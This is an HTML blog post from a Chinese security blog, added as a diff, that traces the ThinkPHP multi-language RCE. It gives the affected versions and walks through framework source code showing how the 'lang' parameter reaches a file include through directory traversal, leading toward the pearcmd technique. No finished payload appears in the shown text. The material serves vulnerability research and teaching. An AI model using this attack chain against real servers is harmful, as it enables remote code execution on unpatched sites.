@@ -1,0 +1,318 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>thinkphp多语言RCE | admire@</title><meta name="author" content="admire@"><meta name="copyright" content="admire@"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="thinkphp 多语言RCE本次复现 不像传统漏洞复现 以正向流程进行漏洞复现，而是以发现漏洞利用点后，如何调用漏洞利用点进行反向调用漏洞流程 ，让初学者学习如何挖掘漏洞 环境准备1composer create-project topthink&#x2F;think tp 6.0.1   清理 Composer 缓存： 运行以下命令清理 Composer 缓存，以确保使用最新的依赖关系信息： 1comp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="thinkphp多语言RCE">
+<meta property="og:url" content="http://example.com/2023/11/02/thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/index.html">
+<meta property="og:site_name" content="admire@">
+<meta property="og:description" content="thinkphp 多语言RCE本次复现 不像传统漏洞复现 以正向流程进行漏洞复现，而是以发现漏洞利用点后，如何调用漏洞利用点进行反向调用漏洞流程 ，让初学者学习如何挖掘漏洞 环境准备1composer create-project topthink&#x2F;think tp 6.0.1   清理 Composer 缓存： 运行以下命令清理 Composer 缓存，以确保使用最新的依赖关系信息： 1comp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.webp">
+<meta property="article:published_time" content="2023-11-02T12:09:25.000Z">
+<meta property="article:modified_time" content="2023-11-02T12:09:57.091Z">
+<meta property="article:author" content="admire@">
+<meta property="article:tag" content="thinkphp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.webp"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/11/02/thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'thinkphp多语言RCE',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-11-02 20:09:57'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="admire@" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-shouyex"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-zuixinwenzhang_huaban"></i><span> 找文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw iconfont icon-fenlei1"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw iconfont icon-biaoqian1"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw iconfont icon-shijianzhou"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-shenghuo"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw iconfont icon-liaotian-04"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/share/"><i class="fa-fw iconfont icon-fenxiang"></i><span> 分享</span></a></li><li><a class="site-page child" href="/daohang/"><i class="fa-fw iconfont icon-daohang"></i><span> 导航站</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-gerenzhongxin"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="admire@"><span class="site-name">admire@</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-shouyex"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-zuixinwenzhang_huaban"></i><span> 找文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw iconfont icon-fenlei1"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw iconfont icon-biaoqian1"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw iconfont icon-shijianzhou"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-shenghuo"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/messageboard/"><i class="fa-fw iconfont icon-liaotian-04"></i><span> 留言板</span></a></li><li><a class="site-page child" href="/share/"><i class="fa-fw iconfont icon-fenxiang"></i><span> 分享</span></a></li><li><a class="site-page child" href="/daohang/"><i class="fa-fw iconfont icon-daohang"></i><span> 导航站</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-gerenzhongxin"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">thinkphp多语言RCE</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-02T12:09:25.000Z" title="发表于 2023-11-02 20:09:25">2023-11-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-02T12:09:57.091Z" title="更新于 2023-11-02 20:09:57">2023-11-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="thinkphp多语言RCE"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="thinkphp-多语言RCE"><a href="#thinkphp-多语言RCE" class="headerlink" title="thinkphp 多语言RCE"></a>thinkphp 多语言RCE</h1><p>本次复现 不像传统漏洞复现 以正向流程进行漏洞复现，而是以发现漏洞利用点后，如何调用漏洞利用点进行反向调用漏洞流程 ，让初学者学习如何挖掘漏洞</p>
+<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think tp 6.0.1</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p><strong>清理 Composer 缓存：</strong> 运行以下命令清理 Composer 缓存，以确保使用最新的依赖关系信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer clear-cache</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>删除 <code>vendor</code> 目录和 <code>composer.lock</code> 文件：</strong> 删除 <code>vendor</code> 目录和 <code>composer.lock</code> 文件，然后重新运行 <code>composer install</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf vendor</span><br><span class="line">composer install</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>手动编辑 <code>composer.lock</code> 文件：</strong> 如果上述步骤未能解决问题，你可以尝试手动编辑 <code>composer.lock</code> 文件，将 <code>&quot;topthink/framework&quot;</code> 的版本更改为 <code>&quot;v6.0.1&quot;</code>。请注意，手动编辑 <code>composer.lock</code> 文件可能会引入其他问题，所以请小心操作。</p>
+<p>打开 <code>composer.lock</code> 文件，找到 <code>&quot;topthink/framework&quot;</code> 的部分，将版本更改为 <code>&quot;v6.0.1&quot;</code>，然后保存文件。</p>
+</li>
+<li><p><strong>运行 <code>composer update</code>：</strong> 运行 <code>composer update</code> 命令，以确保 <code>composer.lock</code> 文件中的版本与 <code>composer.json</code> 文件中的版本一致：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Thinkphp，v6.0.1~v6.0.13，v5.0.x，v5.1.x</p>
+<p>漏洞描述</p>
+<p>如果 Thinkphp 程序开启了多语言功能，那就可以通过 get、header、cookie 等位置传入参数，实现目录穿越+文件包含，通过 pearcmd 文件包含这个 trick 即可实现 RCE。</p>
+<p>Thinkphp6开启多语言模式</p>
+<p>目录：app&#x2F;middleware.php</p>
+<img src="/2023/11/02/thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/image-20231102152057121.png" class="" title="image-20231102152057121">
+
+<p>thinkphp5开启多语言模式</p>
+<p>目录 application&#x2F;config.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;lang_switch_on&#x27;         =&gt; true</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/11/02/thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/image-20231102152245876.png" class="" title="image-20231102152245876">
+
+
+
+<h2 id="多语言模式下的文件包含"><a href="#多语言模式下的文件包含" class="headerlink" title="多语言模式下的文件包含"></a>多语言模式下的文件包含</h2><h4 id="寻找攻击链"><a href="#寻找攻击链" class="headerlink" title="寻找攻击链"></a>寻找攻击链</h4><p>漏洞触发点</p>
+<p>Lang.php下的parse函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parse</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$type</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>, PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">switch</span> (<span class="variable">$type</span>) &#123;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;php&#x27;</span>:</span><br><span class="line">               <span class="variable">$result</span> = <span class="keyword">include</span> <span class="variable">$file</span>; <span class="comment">#任意文件包含</span></span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;yml&#x27;</span>:</span><br><span class="line">           <span class="keyword">case</span> <span class="string">&#x27;yaml&#x27;</span>:</span><br><span class="line">               <span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;yaml_parse_file&#x27;</span>)) &#123;</span><br><span class="line">                   <span class="variable">$result</span> = <span class="title function_ invoke__">yaml_parse_file</span>(<span class="variable">$file</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$result</span>) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$result</span>) ? <span class="variable">$result</span> : [];</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>发现在Lang.php下load函数调用了它</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$range</span> = <span class="string">&#x27;&#x27;</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$range</span> = <span class="variable">$range</span> ?: <span class="variable language_">$this</span>-&gt;range;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>])) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>] = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$lang</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ((<span class="keyword">array</span>) <span class="variable">$file</span> <span class="keyword">as</span> <span class="variable">$_file</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$_file</span>)) &#123;</span><br><span class="line">                <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parse</span>(<span class="variable">$_file</span>);</span><br><span class="line">                <span class="variable">$lang</span>   = <span class="title function_ invoke__">array_change_key_case</span>(<span class="variable">$result</span>) + <span class="variable">$lang</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$lang</span>)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>] = <span class="variable">$lang</span> + <span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;lang[<span class="variable">$range</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>全局搜索load的调用，连续两次Shift键</p>
+<img src="/2023/11/02/thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/image-20231102162445261.png" class="" title="image-20231102162445261">
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadLangPack.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$request</span>, <span class="built_in">Closure</span> <span class="variable">$next</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 自动侦测当前语言</span></span><br><span class="line">        <span class="variable">$langset</span> = <span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">detect</span>(<span class="variable">$request</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">defaultLangSet</span>() != <span class="variable">$langset</span>) &#123;</span><br><span class="line">            <span class="comment">// 加载系统语言包</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">load</span>([</span><br><span class="line">                <span class="variable">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">getThinkPath</span>() . <span class="string">&#x27;lang&#x27;</span> . DIRECTORY_SEPARATOR . <span class="variable">$langset</span> . <span class="string">&#x27;.php&#x27;</span>,</span><br><span class="line">            ]);</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">LoadLangPack</span>(<span class="variable">$langset</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">saveToCookie</span>(<span class="variable">$this</span>-&gt;app-&gt;cookie);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$next</span>(<span class="variable">$request</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>全局搜索handle却没发现任何有被调用的痕迹，这个时候如果是正常情况下已经断了。</p>
+<p>但是LoadLangPack 这个类与多语言加载有关 midddleware.php中注释取消 环境会自动进行类加载</p>
+<p>到此一个完整的攻击链完成 接着就是 构造合适的参数达到对文件包含的利用</p>
+<h4 id="构建攻击参数"><a href="#构建攻击参数" class="headerlink" title="构建攻击参数"></a>构建攻击参数</h4><p>开启多语言后 LoadLangPack.php默认加载的化</p>
+<p>首先分析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$langset</span> = <span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">detect</span>(<span class="variable">$request</span>);</span><br></pre></td></tr></table></figure>
+
+<p>进入Ctrl+B detect()</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detect</span>(<span class="params">Request <span class="variable">$request</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="comment">// 自动侦测设置获取语言选择</span></span><br><span class="line">       <span class="variable">$langSet</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;detect_var&#x27;</span>])) &#123;</span><br><span class="line">           <span class="comment">// url中设置了语言变量</span></span><br><span class="line">           <span class="variable">$langSet</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;detect_var&#x27;</span>]));</span><br><span class="line">       &#125; <span class="keyword">elseif</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">cookie</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;cookie_var&#x27;</span>])) &#123;</span><br><span class="line">           <span class="comment">// Cookie中设置了语言变量</span></span><br><span class="line">           <span class="variable">$langSet</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">cookie</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;cookie_var&#x27;</span>]));</span><br><span class="line">       &#125; <span class="keyword">elseif</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>)) &#123;</span><br><span class="line">           <span class="comment">// 自动侦测浏览器语言</span></span><br><span class="line">           <span class="variable">$match</span> = <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([a-z\d\-]+)/i&#x27;</span>, <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">server</span>(<span class="string">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>), <span class="variable">$matches</span>);</span><br><span class="line">           <span class="keyword">if</span> (<span class="variable">$match</span>) &#123;</span><br><span class="line">               <span class="variable">$langSet</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$matches</span>[<span class="number">1</span>]);</span><br><span class="line">               <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;accept_language&#x27;</span>][<span class="variable">$langSet</span>])) &#123;</span><br><span class="line">                   <span class="variable">$langSet</span> = <span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;accept_language&#x27;</span>][<span class="variable">$langSet</span>];</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;config[<span class="string">&#x27;allow_lang_list&#x27;</span>]) || <span class="title function_ invoke__">in_array</span>(<span class="variable">$langSet</span>, <span class="variable">$this</span>-&gt;config[<span class="string">&#x27;allow_lang_list&#x27;</span>])) &#123;</span><br><span class="line">           <span class="comment">// 合法的语言</span></span><br><span class="line">           <span class="variable language_">$this</span>-&gt;range = <span class="variable">$langSet</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;range;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入第一个if </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;detect_var&#x27;      =&gt; &#x27;lang&#x27;,</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;config[&#x27;detect_var&#x27;]    ==  lang</span><br></pre></td></tr></table></figure>
+
+<p>也就是说我们 传递的参数是lang</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$langSet</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;detect_var&#x27;</span>]));</span><br></pre></td></tr></table></figure>
+
+<p>$request-&gt;get是thinkphp app&#x2F;Request中的方法 这里不详细说明 我们可以理解为 把lang传递的数据小写赋值给$langSet</p>
+<p>$this-&gt;config[‘allow_lang_list’]默认是空</p>
+<p>最后返回 lang传递的数据</p>
+<p>进入load</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;lang-&gt;<span class="title function_ invoke__">load</span>([</span><br><span class="line">                <span class="variable">$this</span>-&gt;app-&gt;<span class="title function_ invoke__">getThinkPath</span>() . <span class="string">&#x27;lang&#x27;</span> . DIRECTORY_SEPARATOR . <span class="variable">$langset</span> . <span class="string">&#x27;.php&#x27;</span>,</span><br><span class="line">            ]);</span><br></pre></td></tr></table></figure>
+
+
+
+<p> $this-&gt;app-&gt;getThinkPath()默认的php安装路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx\tp\vendor\topthink\framework\src\</span><br></pre></td></tr></table></figure>
+
+<p>默认</p>
+<p>DIRECTORY_SEPARATOR&#x3D;’\‘</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx\tp\vendor\topthink\framework\src\lang\我们输入的数据.php</span><br></pre></td></tr></table></figure>
+
+
+
+
+
